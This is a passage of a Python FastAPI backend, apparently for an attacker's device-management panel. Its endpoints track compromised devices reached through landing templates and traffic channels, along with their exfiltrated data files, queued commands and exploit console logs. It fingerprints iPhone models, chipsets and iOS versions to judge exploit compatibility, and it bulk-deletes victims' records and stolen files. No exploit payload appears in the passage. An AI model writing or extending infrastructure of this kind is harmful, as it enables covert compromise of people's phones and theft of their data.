    summary = {"http": 0, "command": 0, "exfil": 0, "device": 0, "exploit": 0, "exploit_console": 0, "raw_log": 0, "errors": 0, "warnings": 0, "success": 0}
    for ev in dedup:
        t = ev.get("type") or ""
        if t in summary:
            summary[t] += 1
        lv = (ev.get("level") or "").lower()
        if lv == "error":
            summary["errors"] += 1
        elif lv == "warn":
            summary["warnings"] += 1
        elif lv == "success":
            summary["success"] += 1
    summary["_dbg"] = _dbg
    summary["total"] = total

    return {"total": total, "items": items, "events": items, "summary": summary, "device_uuid": device_uuid, "_dbg": _dbg}


@router.delete("/{device_uuid}/logs")
async def clear_device_logs(
    request: Request, device_uuid: str, otp_code: str = "",
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    require_module_2fa(db, current_user, "devices", otp_code)
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    deleted = {"logs": 0, "commands": 0, "exfil": 0, "files": 0, "exploit_logs": 0}
    # 1) Logs (http request table)
    try:
        deleted["logs"] = db.query(Log).filter(Log.device_uuid == device_uuid).delete(synchronize_session=False)
    except Exception:
        deleted["logs"] = 0
    # 2) Commands (keep the row if pending in-flight? -> safer to delete all, user asked to clear logs)
    try:
        deleted["commands"] = db.query(Command).filter(Command.device_uuid == device_uuid).delete(synchronize_session=False)
    except Exception:
        deleted["commands"] = 0
    # 3) ExfilData rows + actual files on disk
    try:
        exfil_rows = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).all()
        from pathlib import Path as _P
        for er in exfil_rows:
            fp = getattr(er, "file_path", None)
            if fp:
                try:
                    p = _P(str(fp))
                    if p.exists() and p.is_file():
                        try:
                            p.unlink()
                            deleted["files"] += 1
                        except Exception:
                            pass
                except Exception:
                    pass
        deleted["exfil"] = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).delete(synchronize_session=False)
    except Exception:
        deleted["exfil"] = 0
    # 4) DeviceExploitLog (exploit 过程控制台细粒度日志)
    try:
        deleted["exploit_logs"] = (db.query(DeviceExploitLog)
                                    .filter(DeviceExploitLog.device_uuid == device_uuid)
                                    .delete(synchronize_session=False))
    except Exception:
        deleted["exploit_logs"] = 0
    db.commit()
    username = current_user.username if current_user else "anonymous"
    try:
        create_audit_log(db, username=username, action="device_logs_clear", resource_type="device",
                         resource_id=device_uuid,
                         detail=(f"清空 logs={deleted['logs']}, commands={deleted['commands']}, "
                                 f"exfil={deleted['exfil']}, files={deleted['files']}, "
                                 f"exploit_logs={deleted['exploit_logs']}"),
                         ip_address=request.client.host if request.client else None)
    except Exception:
        db.rollback()
        db.commit()
    return {"device_uuid": device_uuid, "deleted": deleted}


@router.get("/{device_uuid}")
async def get_device(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    cutoff = datetime.now() - timedelta(minutes=5)
    if device.last_seen and isinstance(device.last_seen, datetime) and device.last_seen >= cutoff:
        device.status = "active"
    else:
        device.status = "offline"
    group_map, channel_map, template_map = {}, {}, {}
    try:
        if device.group_id is not None:
            g = db.query(DeviceGroup).filter(DeviceGroup.id == device.group_id).first()
            if g: group_map[g.id] = {"id": g.id, "name": g.name, "color": g.color}
        if getattr(device, "channel_id", None) is not None:
            c = db.query(TrafficChannel).filter(TrafficChannel.id == device.channel_id).first()
            if c: channel_map[c.id] = {"id": c.id, "slug": c.slug, "name": c.name, "color": c.color}
        if getattr(device, "template_id", None) is not None:
            t = db.query(LandingTemplate).filter(LandingTemplate.id == device.template_id).first()
            if t: template_map[t.id] = {"id": t.id, "slug": t.slug, "name": t.name}
    except Exception:
        pass
    dct = {c.name: getattr(device, c.name) for c in device.__table__.columns}
    for k in ("first_seen", "last_seen", "last_command_time"):
        if isinstance(dct.get(k), datetime):
            dct[k] = dct[k].isoformat()
    if device.group_id and device.group_id in group_map:
        dct["group"] = group_map[device.group_id]
        dct["group_name"] = group_map[device.group_id].get("name")
        dct["group_color"] = group_map[device.group_id].get("color")
    else:
        dct["group"] = dct["group_name"] = dct["group_color"] = None
    if device.channel_id and device.channel_id in channel_map:
        c = channel_map[device.channel_id]
        dct["channel_slug"] = c.get("slug"); dct["channel_name"] = c.get("name"); dct["channel_color"] = c.get("color")
    else:
        dct["channel_slug"] = dct["channel_name"] = dct["channel_color"] = None
    if device.template_id and device.template_id in template_map:
        t = template_map[device.template_id]
        dct["template_slug"] = t.get("slug"); dct["template_name"] = t.get("name")
    else:
        dct["template_slug"] = dct["template_name"] = None
    parsed = _parse_ua_v2(device.user_agent) if device.user_agent else {}
    model_from_hw = _guess_model_from_hw_model(getattr(device, "hw_model", None))
    if model_from_hw and (not dct.get("device_model") or dct["device_model"] in ("iPhone", "iPad", "iPod Touch", "Android", "Mac")):
        dct["device_model"] = model_from_hw
    chip = _guess_chipset(
        getattr(device, "hw_model", None),
        model_from_hw or dct.get("device_model"),
        dct.get("os_version"),
        parsed.get("device_family"),
    )
    if chip and (not dct.get("chipset")):
        dct["chipset"] = chip
    elif chip and dct.get("chipset") and ("/" not in str(dct["chipset"])) and ("/" in chip):
        dct["chipset"] = chip
    os_ver_from_ua = parsed.get("os_version")
    def _maj(v):
        try:
            return int(str(v).split(".")[0])
        except Exception:
            return 0
    if os_ver_from_ua and (not dct.get("os_version")):
        dct["os_version"] = os_ver_from_ua
    elif os_ver_from_ua and dct.get("os_version"):
        try:
            maj_old = _maj(dct["os_version"])
            maj_new = _maj(os_ver_from_ua)
            if maj_new > maj_old or maj_old > 25 >= maj_new:
                dct["os_version"] = os_ver_from_ua
        except (ValueError, TypeError, IndexError):
            pass
    if not dct.get("os_version") and parsed.get("safari_version_raw"):
        maj_saf = _maj(parsed["safari_version_raw"])
        maj_cpu = _maj(parsed.get("os_version") or "0")
        if maj_saf > 0 and maj_saf > maj_cpu:
            dct["os_version"] = parsed["safari_version_raw"]
    bname = parsed.get("browser_name")
    dct["browser_name"] = bname
    dct["browser_version"] = parsed.get("browser_version")
    dct["webkit_version"] = parsed.get("webkit_version")
    dct["os_type"] = parsed.get("os_type")
    if parsed.get("browser_version") and (not dct.get("safari_version")):
        dct["safari_version"] = parsed["browser_version"]
    dct["compatible_level"] = _is_ios_compatible(dct.get("os_version"), bname)
    return dct


@router.patch("/{device_uuid}")
async def patch_device(request: Request, device_uuid: str, payload: DevicePatchRequest, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    changes = []
    if payload.group_id is not None:
        if payload.group_id <= 0:
            if device.group_id is not None:
                changes.append(f"group_id: {device.group_id} -> NULL")
            device.group_id = None
        else:
            g = db.query(DeviceGroup).filter(DeviceGroup.id == payload.group_id).first()
            if not g:
                raise HTTPException(status_code=400, detail="分组不存在")
            changes.append(f"group_id -> {g.name}")
            device.group_id = payload.group_id
    if hasattr(payload, "note") and payload.note is not None:
        device.note = (payload.note or "").strip() or None
        changes.append("note updated")
    if payload.status is not None and payload.status in ("active", "offline"):
        if device.status != payload.status:
            changes.append(f"status: {device.status} -> {payload.status}")
        device.status = payload.status
    if payload.enabled is not None:
        new_en = 1 if payload.enabled else 0
        if int(device.enabled or 0) != new_en:
            changes.append(f"enabled -> {new_en}")
        device.enabled = new_en
    for attr in ("host", "referer", "access_path", "hw_model", "ip_location"):
        v = getattr(payload, attr, None)
        if v is not None:
            new_v = (v or "").strip() or None
            if (getattr(device, attr, None) or "") != (new_v or ""):
                changes.append(f"{attr} updated")
            setattr(device, attr, new_v)
    if hasattr(payload, "channel_id") and payload.channel_id is not None:
        new_cid = int(payload.channel_id) if payload.channel_id and int(payload.channel_id) > 0 else None
        if new_cid is not None:
            if not db.query(TrafficChannel).filter(TrafficChannel.id == new_cid).first():
                raise HTTPException(status_code=400, detail="目标渠道不存在")
        if getattr(device, "channel_id", None) != new_cid:
            changes.append(f"channel_id updated")
        device.channel_id = new_cid
    if hasattr(payload, "template_id") and payload.template_id is not None:
        new_tid = int(payload.template_id) if payload.template_id and int(payload.template_id) > 0 else None
        if new_tid is not None:
            if not db.query(LandingTemplate).filter(LandingTemplate.id == new_tid).first():
                raise HTTPException(status_code=400, detail="目标模板不存在")
        if getattr(device, "template_id", None) != new_tid:
            changes.append(f"template_id updated")
        device.template_id = new_tid
    db.commit()
    db.refresh(device)
    if changes:
        username = current_user.username if current_user else "anonymous"
        create_audit_log(db, username=username, action="device_update", resource_type="device",
                         resource_id=device_uuid, detail="; ".join(changes),
                         ip_address=request.client.host if request.client else None)
    return {"device_uuid": device_uuid, "group_id": device.group_id, "note": device.note,
            "status": device.status, "enabled": bool(device.enabled), "host": device.host,
            "channel_id": getattr(device, "channel_id", None), "template_id": getattr(device, "template_id", None)}


@router.post("/batch-delete")
async def batch_delete_devices(request: Request, payload: BatchDeleteRequest, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    uuids = list(payload.device_uuids)
    if not uuids:
        raise HTTPException(status_code=400, detail="未提供设备 UUID")
    q = db.query(Device).filter(Device.device_uuid.in_(uuids))
    q = apply_agent_filter_device(q, db, current_user)
    devices = q.all()
    if not devices:
        return {"deleted": 0}
    deleted = 0
    username = current_user.username if current_user else "anonymous"
    for dev in devices:
        try:
            db.query(ExfilData).filter(ExfilData.device_uuid == dev.device_uuid).delete()
            db.delete(dev)
            deleted += 1
        except Exception:
            db.rollback()
            raise
    db.commit()
    if deleted:
        create_audit_log(db, username=username, action="device_batch_delete", resource_type="device",
                         resource_id=",".join(uuids)[:200], detail=f"批量删除 {deleted} 台设备",
                         ip_address=request.client.host if request.client else None)
    return {"deleted": deleted}


@router.post("/batch-set-group")
async def batch_set_group(request: Request, payload: BatchSetGroupRequest, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    uuids = list(payload.device_uuids)
    gid = payload.group_id if (payload.group_id is not None and payload.group_id > 0) else None
    if gid is not None and not db.query(DeviceGroup).filter(DeviceGroup.id == gid).first():
        raise HTTPException(status_code=400, detail="目标分组不存在")
    updated = db.query(Device).filter(Device.device_uuid.in_(uuids)).update({Device.group_id: gid}, synchronize_session=False)
    db.commit()
    if updated:
        username = current_user.username if current_user else "anonymous"
        create_audit_log(db, username=username, action="device_batch_group", resource_type="device",
                         resource_id=",".join(uuids)[:200], detail=f"批量设置分组 {updated} 台",
                         ip_address=request.client.host if request.client else None)
    return {"updated": updated}


@router.post("/batch-set-enabled")
async def batch_set_enabled(request: Request, payload: BatchSetEnabledRequest, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    uuids = list(payload.device_uuids)
    val = 1 if payload.enabled else 0
    updated = db.query(Device).filter(Device.device_uuid.in_(uuids)).update({Device.enabled: val}, synchronize_session=False)
    db.commit()
    return {"updated": updated}


@router.post("/batch-set-channel")
async def batch_set_channel(request: Request, payload: BatchSetChannelRequest, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    uuids = list(payload.device_uuids)
    cid = int(payload.channel_id) if (payload.channel_id and int(payload.channel_id) > 0) else None
    if cid is not None and not db.query(TrafficChannel).filter(TrafficChannel.id == cid).first():
        raise HTTPException(status_code=400, detail="目标渠道不存在")
    updated = db.query(Device).filter(Device.device_uuid.in_(uuids)).update({Device.channel_id: cid}, synchronize_session=False)
    db.commit()
    return {"updated": updated}


@router.post("/batch-set-template")
async def batch_set_template(request: Request, payload: BatchSetTemplateRequest, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    uuids = list(payload.device_uuids)
    tid = int(payload.template_id) if (payload.template_id and int(payload.template_id) > 0) else None
    if tid is not None and not db.query(LandingTemplate).filter(LandingTemplate.id == tid).first():
        raise HTTPException(status_code=400, detail="目标模板不存在")
    updated = db.query(Device).filter(Device.device_uuid.in_(uuids)).update({Device.template_id: tid}, synchronize_session=False)
    db.commit()
    return {"updated": updated}


@rate_limit("10/minute")
@router.delete("/{device_uuid}")
async def delete_device(request: Request, device_uuid: str, otp_code: str = "", db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    require_module_2fa(db, current_user, "devices", otp_code)
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).delete()
    db.delete(device)
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_delete", resource_type="device",
                     resource_id=device_uuid, detail=f"Deleted device {device_uuid}",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Device deleted"}
